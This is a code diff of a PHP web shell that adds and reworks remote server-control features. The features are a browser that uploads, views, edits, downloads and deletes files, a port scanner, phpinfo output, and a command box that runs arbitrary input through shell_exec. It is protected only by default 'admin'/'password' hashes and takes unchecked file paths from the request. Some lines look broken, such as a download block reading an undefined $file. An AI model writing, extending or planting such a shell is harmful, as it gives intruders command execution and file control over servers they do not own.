@@ -17,8 +17,8 @@
 error_reporting(E_ALL);
 set_time_limit(5);
 define('AUTHENT', true);
-define('USER_HASH', '21232f297a57a5a743894a0e4a801fc3'); // admin      /* Decomment the lines */
-define('PASS_HASH', '5f4dcc3b5aa765d61d8327deb882cf99'); // password   /* When you have changed hashes */
+define('USER_HASH', '21232f297a57a5a743894a0e4a801fc3'); // admin      /* Change the hashes to whatever you want */
+define('PASS_HASH', '5f4dcc3b5aa765d61d8327deb882cf99'); // password   /* and remove the comments */
 define('IS_WIN', substr(PHP_OS, 0, 3) == 'WIN' ? true : false);
 define('SCRIPT_NAME', str_replace('\\', '/', $_SERVER['SCRIPT_NAME']));
 define('DIR', (isset($_GET['d']) ? $_GET['d'] : (isset($_POST['d']) ? $_POST['d'] : '.')));
@@ -70,22 +70,25 @@ if (!$chdir)
 $cwd = (IS_WIN ? str_replace('\\', '/', getcwd()) : getcwd());
 
 
-// Display phpinfo
+/* Display phpinfo */
 if (MODE == 'phpinfo')
 {
 	phpinfo();
 	die;
 }
 
+/* Download file */
 if (isset($_GET['d']) && isset($_GET['l']))
 {
-	$file = $cwd .'/'. $_GET['l'];
-	header('Content-Type: application/save');
-	header('Content-disposition: attachment; filename='. $_GET['l']);
-	echo file_get_contents($file);
+	$content_type = function_exists('mime_content_type') ? mime_content_type($_GET['l']) : 'application/octet-stream';
+	header('Content-Type: '. $content_type);
+	header('Content-disposition: attachment; filename='. basename($_GET['l']));
+	header('Content-Transfer-Encoding: binary');
+	readfile($file);
 	die;
 }
 
+/* Delete file */
 if (isset($_GET['d']) && isset($_GET['r']))
 {
 	$file = $cwd .'/'. $_GET['r'];
@@ -93,20 +96,46 @@ if (isset($_GET['d']) && isset($_GET['r']))
 		$deleted = '<br><span style="color: #048839;">File <b>'. $file .'</b> deleted.</span>';
 }
 
+/* Save edited file to disk */
+if (isset($_POST['submit_file']))
+{
+	$file = stripslashes($_POST['filename']);
+	file_put_contents($file, stripslashes($_POST['file_contents']));
+	echo '<br><span style="color:green">File <b>'. $file .'</b> saved.</span><br>';
+}
+
+/* Edit file */
+if (isset($_GET['d']) && isset($_GET['e']))
+{
+		echo '<hr>[ Editing '. stripslashes($cwd .'/'. $_GET['e']) .' ] :<hr>
+		<form name="edit_file" method="post" action"'. SCRIPT_NAME . build_params() .'><textarea cols="130" rows="30" name="file_contents">'. 
+		file_get_contents($_GET['e']) .'</textarea><input type="hidden" name="filename" value="'. stripslashes($cwd .'/'. $_GET['e']) .'" />
+		<br><input type="submit" name="submit_file" value="Write to disk"/ >
+		</form>';
+		die;
+}
+
+/* View file */
+if (isset($_GET['d']) && isset($_GET['v']))
+{
+	if (file_exists($_GET['v']))
+	{
+		$info = pathinfo($_GET['v']);
+		$content_type = function_exists('mime_content_type') ? mime_content_type($_GET['v']) : 'text/plain';
+		header('Content-Type: '. $content_type);
+		readfile($_GET['v']);
+		die;
+	}
+	else die('File not found.');
+}
+
 $css = '<style>* {font-family: monospace, sans-serif;font-size: 11px;}
 .phpinfo {font-family: Arial, sans-serif;font-size: 12px;}
 table td {padding: 0px 15px 0px 15px;}
 a {text-decoration: none;}
 a.plus {font-weight: bold;color: #aaa;}
-a.linkdir {text-decoration: none;color: #55f;}
+a.linkdir {text-decoration: none;color: #55f;min-height: 32px;}
 a.menu {font-weight: bold;font-size: 11px;color: #55f;}</style>';
-
-// Save uploaded file
-if (isset($_POST['submit_file']))
-{
-	file_put_contents($_POST['filename'], $_POST['file_contents']);
-	echo '<br><span style="color:green">File <b>'. $_POST['filename'] .'</b> saved.</span><br>';
-}
 
 // Display tree
 if (MODE == 'tree')
@@ -122,49 +151,71 @@ if (MODE == 'tree')
 // Display virtual shell
 if (MODE == 'shell')
 {
+	if (isset($_COOKIE['cs']))
+		@chdir(base64_decode($_COOKIE['cs']));
+	
+	else
+		setcookie('cs', base64_encode(getcwd()));
+
 	if (isset($_POST['cmd']))
 	{
-
+		/* Simulate built-in 'cd' command */
 		if (substr($_POST['cmd'], 0, 3) == 'cd ')
 		{
-			$cmd_tab = explode(' ', $_POST['cmd']);
-			if (isset($cmd_tab[1]) AND !empty($cmd_tab[1]))
+			$cmd_cd = substr($_POST['cmd'], 3);
+
+			if (isset($cmd_cd) AND !empty($cmd_cd))
 			{
-				if (!@chdir(stripslashes($cmd_tab[1])))
-					echo stripslashes($cmd_tab[1]) .": No such file or directory";
+				if (IS_WIN)
+				{
+					$cmd_cd = stripslashes($cmd_cd);
+					if (strlen($cmd_cd) == 2 && $cmd_cd[1] == ':') $cmd_cd .= '\\';
+					if ($cmd_cd[0] == '\\')	$dir = stripslashes(substr(getcwd(), 0, 2) .'\\'. $cmd_cd);
+					elseif (strlen($cmd_cd) >= 2 && $cmd_cd[1] == ':') $dir = stripslashes(substr($cmd_cd, 0, 2) .'\\'. substr($cmd_cd, 2));
+					else $dir = realpath(getcwd() .'\\'. $cmd_cd);
+				}
 				else
-					setcookie('cs', base64_encode(stripslashes($cmd_tab[1])));
+					$dir = $cmd_cd;
+				
+				$dir = strip_tags($dir);
+				if (is_dir($dir))
+				{
+					chdir($dir);
+					setcookie('cs', base64_encode(getcwd()));
+				}
+				else echo $dir .": no such file or directory\n";
 			}
 		}
 
 		else
 		{
-			if (isset($_COOKIE['cs']))
-				@chdir(base64_decode($_COOKIE['cs']));
-
 			$cmd_output = shell_exec($_POST['cmd'] .' 2>&1');
-			$cmd_output = strtr($cmd_output, array(chr(255) => ' ', chr(244) => 'ô', chr(224) => 'à', chr(195) => 'é', chr(130) => 'é', chr(233) => 'é'));
+			$cmd_output = strtr($cmd_output, array(chr(255) => ' ', chr(244) => 'ô', chr(224) => 'à', chr(195) => 'é', chr(130) => 'é', chr(233) => 'é', chr(160) => ' '));
 			echo $cmd_output;
 		}
 		die;
-		echo "DIE HERE";
 	}
 	
 	$uri = (IS_WIN ? str_replace('\\', '/', $_SERVER['SCRIPT_NAME']) : $_SERVER['SCRIPT_NAME']) . '?mode=shell' . build_params('mode');
+	$prompt_suffix = IS_WIN ? '>' : '&nbsp;$&nbsp;';
 
-	echo $html_header . '<style>#vshell_output {width: 800px;height: 350px;background-color: #333;color: #fff;border: 0;margin-bottom: -1px;}
-	#vshell_cmd {width: 800px;height: 20px;display: block;border: 0;background-color: #333;color: #fff;margin: 0;padding-left: 5px;}</style>
-	<textarea readonly="readonly" name="vshell_output" id="vshell_output"></textarea>
-	<input type="text" name="vshell_cmd" id="vshell_cmd" onKeyPress="checkEnter(event)"/>
-	<script type="text/javascript">function checkEnter(e){var key;if(window.event)key = window.event.keyCode;else key = e.which;
-	if (key == 13){cmd = document.getElementById(\'vshell_cmd\').value;postMethod(cmd);return true;}else return false;}function getHTTPObject(){
-	var http = false;if(typeof ActiveXObject != \'undefined\'){try {http = new ActiveXObject("Msxml2.XMLHTTP");}
-	catch (e){try {http = new ActiveXObject("Microsoft.XMLHTTP");}catch (E) {http = false;}}}else if(XMLHttpRequest){try {http = new XMLHttpRequest();}
-	catch (e) {http = false;}}return http;}function postMethod(cmd){var http = getHTTPObject();var params = "cmd="+ cmd.replace(\'+\',\'%2b\');
-	var ta = document.getElementById(\'vshell_output\');var tcmd = document.getElementById(\'vshell_cmd\');http.open("POST", "'. $uri .'", true);
-	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");http.setRequestHeader("Content-length", params.length);http.setRequestHeader("Connection", "close");
-	http.onreadystatechange = function(){if(http.readyState == 4 && http.status == 200) {ta.value += "$ "+cmd+ "\n"+http.responseText;ta.scrollTop=ta.scrollHeight;tcmd.value="";}};
-	http.send(params);}document.getElementById(\'vshell_cmd\').focus();</script>';
+	echo $html_header . '<style>*{background-color: #333;} #vshell_output {width: 800px;height: 350px;background-color: #333;color: #fff;border: 0;margin-bottom: -1px;}
+	#vshell_cmd {width: 800px;height: 20px;display: block;border: 0;background-color: #333;color: #fff;margin: 0;padding-left: 5px;}
+	.text{ font-family: "Lucida Console", "Courrier New", monospace, sans-serif; font-size: 11px; color: #fff; }</style>
+	<textarea readonly="readonly" name="vshell_output" id="vshell_output" style="resize: none;" class="text"></textarea>
+	<table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td><span class="text" id="prompt"></span></td><td style="width: 100%;">
+	<input type="text" name="vshell_cmd" id="vshell_cmd" onKeyPress="checkEnter(event)" style="width: 100%; resize: none;" class="text" /></td></tr></table>
+
+	<script type="text/javascript">
+	function ReadCookie(name) { var parts = document.cookie.split(/;\s*/); for (var i=0;i<parts.length;i++)	{ if (parts[i].substring(0, 3) == name+"=") return atob(unescape(parts[i].substring(3))); } }
+	function checkEnter(e)    { var key; if (window.event)	key = window.event.keyCode; else key = e.which; if (key == 13) { cmd = document.getElementById(\'vshell_cmd\').value; postMethod(cmd); return true; } else return false; }
+	function updatePrompt()   { document.getElementById(\'prompt\').innerHTML = ReadCookie(\'cs\') + "'. $prompt_suffix .' "; }
+	function getHTTPObject()  { var http = false; if (typeof ActiveXObject != \'undefined\') {try { http = new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) { try { http = new ActiveXObject("Microsoft.XMLHTTP"); }	catch (E) { http = false;}}} else if (XMLHttpRequest) { try { http = new XMLHttpRequest(); }	catch (e) {http = false;}} return http;	}
+	function postMethod(cmd)  { var http = getHTTPObject(); var params = "cmd="+ cmd.replace(\'+\',\'%2b\'); var ta = document.getElementById(\'vshell_output\'); var tcmd = document.getElementById(\'vshell_cmd\'); http.open("POST", "'. $uri .'", true); http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); http.setRequestHeader("Content-length", params.length); http.setRequestHeader("Connection", "close"); http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 200) { ta.value += "$ "+cmd+ "\n" + http.responseText; ta.scrollTop = ta.scrollHeight; tcmd.value=""; updatePrompt() } }; http.send(params); }
+	
+	updatePrompt();
+	document.getElementById(\'vshell_cmd\').focus();
+	</script>';
 
 	echo $html_footer;
 }
@@ -178,7 +229,7 @@ if (MODE == 'browser')
 	echo '<p>'. ((MODE == 'browser' and !isset($_GET['portscan'])) ? 'browser' : 
 		'<a href="'. SCRIPT_NAME .'?mode=browser'. build_params('mode') .'" class="menu">browser</a>') .' - '. 
 		(MODE == 'shell' ? 'shell' : '<a href="" onclick="javascript:window.open(\''. SCRIPT_NAME .
-		'?mode=shell'. build_params('mode') .'\', \'\', \'width=850,height=440,toolbar=no,scrollbars=no\'); return false;" class="menu">shell</a>') .' - '.
+		'?mode=shell'. build_params('mode') .'\', \'\', \'width=820,height=385,toolbar=no,scrollbars=no\'); return false;" class="menu">shell</a>') .' - '.
 		(MODE == 'tools' ? 'tools' : '<a href="'. SCRIPT_NAME .'?mode=phpinfo'. build_params('mode') .'" class="menu">phpinfo</a>') .' - ' .
 		(isset($_GET['portscan']) ? 'portscan' : '<a href="'. SCRIPT_NAME .'?mode=browser&d='. $cwd .'&portscan=1'. build_params(array('mode', 'd', 'portscan')) .'" class="menu">portscan</a>') .'</p>';
 		
@@ -186,7 +237,7 @@ if (MODE == 'browser')
 	<table height=700 border="0">
 	  <tr>
 	    <td style="padding:0;">
-		<iframe src="'. SCRIPT_NAME .'?mode=tree&dir='. $cwd . build_params(array('mode', 'dir')) .'" frameborder="0" width="400" height="100%"></iframe>
+		<iframe src="'. SCRIPT_NAME .'?mode=tree&dir='. $cwd . build_params(array('mode', 'dir')) .'" frameborder="0" width="350" height="100%"></iframe>
 	    </td>
 	    <td valign="top">';
 
@@ -264,7 +315,7 @@ if (MODE == 'browser')
 		if (IS_WIN) $cwd = str_replace('\\', '/', $cwd);
 		
 		echo '<table border="0">
-			  <tr><td colspan="7" style="padding-bottom: 20px;">ls -al '. $cwd .'
+			  <tr><td colspan="7" style="padding-bottom: 20px;">ls -al '. utf8_decode($cwd) .'
 			  <br><form action="'. SCRIPT_NAME .'?mode=browser&d='. $cwd . build_params(array('mode', 'd')) .'" method="post" enctype="multipart/form-data" name="file_upload">
 			  <input name="uploaded_file" type="file" /><input type="submit" name="submit" value="Upload here" /></form>'. 
 			  (isset($uploaded) ? $uploaded : '') . (isset($deleted) ? $deleted : '') .'</td></tr>'. $lf;
@@ -312,10 +363,10 @@ if (MODE == 'browser')
 			}
 		
 			echo '<tr style="height: 16px;"><td>'. $perms .'</td><td>'. $owner['name'] .'</td><td>'. $group['name'] .'</td>';
-			echo '<td>'. $val .'</td><td align="right">'. $fsize .'</td><td>'. @date('Y/m/d H:i', $mtime) .'</td>';
+			echo '<td>'. utf8_decode($val) .'</td><td align="right">'. $fsize .'</td><td>'. @date('Y/m/d H:i', $mtime) .'</td>';
 			echo '<td>'. (!$is_dir ? 
-				'<a title="View" href="'. $view .'"><img src="'. SCRIPT_NAME .'?genimg=view" alt="View" /></a> '.
-				'<a title="Edit" href="'. $edit .'"><img src="'. SCRIPT_NAME .'?genimg=edit" alt="Edit" /></a> '.
+				'<a target="_blank" title="View" href="'. $view .'"><img src="'. SCRIPT_NAME .'?genimg=view" alt="View" /></a> '.
+				'<a target="_blank" title="Edit" href="'. $edit .'"><img src="'. SCRIPT_NAME .'?genimg=edit" alt="Edit" /></a> '.
 				'<a title="Save" href="'. $down .'"><img src="'. SCRIPT_NAME .'?genimg=save" alt="Download" /></a> '.
 				'<a title="Delete" href="'. $dele .'"><img src="'. SCRIPT_NAME .'?genimg=delete" alt="Delete" /></a> ' : '&nbsp;');
 			echo '</td></tr>'. $lf;	
@@ -323,20 +374,7 @@ if (MODE == 'browser')
 		echo '</table>';
 	}
 
-	echo '</td></tr></table>';
-
-	if (isset($_GET['v'])) echo '<br><hr>[ Viewing '. $cwd .'/'. $_GET['v'] .' ] :<hr><pre>'. htmlentities(file_get_contents($_GET['v'])) .'</pre>';
-
-	if (isset($_GET['e']))
-	{
-		echo '<br><hr>[ Editing '. $cwd .'/'. $_GET['e'] .' ] :<hr>
-		<form name="edit_file" method="post" action"'. SCRIPT_NAME . build_params() .'><textarea cols="130" rows="30" name="file_contents">'. 
-		file_get_contents($_GET['e']) .'</textarea><input type="hidden" name="filename" value="'. $cwd .'/'. $_GET['e'] .'" />
-		<br><input type="submit" name="submit_file" value="Write to disk"/ >
-		</form>';
-	}
-
-	echo $html_footer;
+	echo '</td></tr></table>'. $html_footer;
 
 	clearstatcache();
 }
@@ -391,8 +429,8 @@ function build_params($p = array())
 // Prints a line in the tree
 function print_tree_line($dir, $str, $space = '')
 {
-	return $space .'<a href="'. SCRIPT_NAME .'?mode=tree&dir='. $dir . build_params(array('mode', 'dir')) .'" class="plus">[+]</a>
-		<a href="'. SCRIPT_NAME .'?mode=browser&d='. $dir . build_params(array('mode', 'dir')) .'" class="linkdir" target="_top">'. $str ."</a><br>\n";
+	return $space .'<a href="'. SCRIPT_NAME .'?mode=tree&dir='. $dir . build_params(array('mode', 'dir')) .'" class="plus"><img src="'. SCRIPT_NAME .'?genimg=plus" /></a>
+		<a href="'. SCRIPT_NAME .'?mode=browser&d='. $dir . build_params(array('mode', 'dir')) .'" class="linkdir" target="_top">'. utf8_decode($str) ."</a><br>\n";
 }
 
 // Lists files in a directory
@@ -405,7 +443,7 @@ function list_dir($dir, $nr = 0)
 	
 	$arbo = explode('/', $dir);
 	$space = $ret = $curdir = '';
-	for ($i = -1; $i != $nr; $i++) $space .= '&nbsp;&nbsp;&nbsp;&nbsp;';
+	for ($i = -1; $i != $nr; $i++) $space .= '&nbsp;&nbsp;&nbsp;';
 	
 	for ($j = 0; $j <= $nr; $j++) $curdir .= $arbo[$j] . '/';
 	
@@ -465,6 +503,7 @@ function display_image($img)
 		case 'edit': $img = base64_decode('R0lGODlhEAAQAPQAADMzMwBVABFvEWZmZpkzM8wzM8xmM91mZv9mZiKIIjOZM02zTWbMZuWATf+ZZoiIiJmZmaqqqru7u/+/mczMzN3d3d7e3v/lzP///wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAVOICaOpAghSKliUBUdxTomTEQ9sUwvyiMNOgYvkRhYVjsFMXBUJZfN0jPBRAqV1ChpWnVeodZhduW4CLBdVeMyCYxlgInDkV4BAASDdhUCADs='); break ;
 		case 'save': $img = base64_decode('R0lGODlhEAAQAPQAADo6OkhISFlZWWhoaHp6eoeHh5aWlqqqqrS0tL/M2afT/7nc/8PDw9vb28jk/93u/+bm5un0//7+/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAV+oCSOZCkWg6IsTuss6lCIg2GSxkDbt5iLAkNkSCwaBMBCcRkpICWCQuJBrVITTlEANeh6vYWAlkAum8liSYDMaLjfDPR40AAA3u4BIQ0YCBgBAQyDgwIDACJ9AQgCAgiPjwGHIgh2B10HmZl9iJR9BAWhBQSHAE8ieKluEBIhADs='); break ;
 		case 'delete': $img = base64_decode('R0lGODlhEAAQAPQAAMwiANY2FuM9GuNBH9ZFJ9pXPPpYNuxLKf1hP/1mRfp5V+9vT9V+beJtVdaAb9+Kef6FZf6VdPOJctmXiv+qiO+mlf+yofm/s97CvP7BtN7e3v7k3uvr6/7+/v/n4ejNySH5BAAAAAAALAAAAAAQABAAAAWZYCeOZFl6FpQkkOWZXaZAEUVFkJKVWRItBACAsIgkdqLNArIoTDSaQoLC3Igqi+aH07FMAdmKaKE4iLvfxkGxEB0gAq6XAnBwBJCDaFBG0+0dawMiUgYSX4AXBgkFIg8HK39cHgoJBw8iHwQGEAASXBkQCAYEHyMTAQeLKwkGBwETJByoAqquArBcshgMQUMMGLomHBxQxCUhADs='); break ;
+		case 'plus': $img = base64_decode('R0lGODlhCQAJAPQAACkpKTIyMj8/P0NDQ1VVVWdnZ2tra3d3d35+fo6OjpOTk5iYmJ6enqSkpKmpqa+vr7Ozs7a2try8vNTU1ODg4OXl5ebm5unp6e/v7/Ly8vX19fb29vf39/v7+/z8/P///yH5BAgAAAAALAAAAAAJAAkAAAU74BSNZDRBX6p+0PNxHAJ/j9NlmfFlndNohwJhENA0GBiLR+DxfBiLC4UC2FAuC0VlW+lsFZKEeJyQhAAAOw=='); break ;
 		default: die('wrong image');
 	}
 	header('Content-Type: image/gif');
